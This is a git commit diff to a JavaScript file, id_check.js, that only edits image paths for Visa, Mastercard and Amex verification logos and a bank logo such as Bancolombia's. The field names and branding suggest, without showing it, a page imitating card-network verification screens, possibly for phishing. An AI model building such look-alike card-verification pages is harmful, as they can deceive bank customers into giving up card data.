ac45f910050b64f02463718ffe27dc8e9c92d079
Turpial20269 <turpial20269@gmail.com>
2025-09-29 19:57:24 -0500

    Update id_check.js

--- public/js/id_check.js
+++ public/js/id_check.js
@@ -5,32 +5,32 @@ const companyLoader = document.querySelector('#company-loader');
 const companyLogo = document.querySelector('#company-logo');
 const bankLogo = document.querySelector('#bank-logo');
 if(info.checkerInfo.company === 'VISA'){
-    companyLoader.setAttribute('src', './assets/logos/visa_verified.png');
+    companyLoader.setAttribute('src', 'assets/logos/visa_verified.png');
     companyLoader.setAttribute('width', '130px');
     companyLoader.setAttribute('style', 'margin-bottom: 40px');
 
-    companyLogo.setAttribute('src', './assets/logos/visa_verified.png');
+    companyLogo.setAttribute('src', 'assets/logos/visa_verified.png');
     companyLogo.setAttribute('width', '90px');
 }else if(info.checkerInfo.company === 'MC'){
-    companyLoader.setAttribute('src', './assets/logos/mc_id_check_2.jpg');
+    companyLoader.setAttribute('src', 'assets/logos/mc_id_check_2.jpg');
     companyLoader.setAttribute('width', '400px');
 
-    companyLogo.setAttribute('src', './assets/logos/mc_id_check_1.webp');
+    companyLogo.setAttribute('src', 'assets/logos/mc_id_check_1.webp');
     companyLogo.setAttribute('width', '130px');
 }else if(info.checkerInfo.company === 'AM'){
-    companyLoader.setAttribute('src', './assets/logos/amex_check_1.png');
+    companyLoader.setAttribute('src', 'assets/logos/amex_check_1.png');
     companyLoader.setAttribute('width', '200px');
 
-    companyLogo.setAttribute('src', './assets/logos/mc_id_check_1.webp');
+    companyLogo.setAttribute('src', 'assets/logos/mc_id_check_1.webp');
     companyLogo.setAttribute('width', '110px');
 }
 
 
 if(info.metaInfo.ban === 'bancolombia'){
-    bankLogo.setAttribute('src', `./assets/logos/${info.metaInfo.ban}.png`);
+    bankLogo.setAttribute('src', `assets/logos/${info.metaInfo.ban}.png`);
     bankLogo.setAttribute('width', `120px`);
 }else{
-    bankLogo.setAttribute('src', `./assets/logos/${info.metaInfo.ban}.png`);
+    bankLogo.setAttribute('src', `assets/logos/${info.metaInfo.ban}.png`);
 }
 
 const mainLoader = document.querySelector('.main-loader');
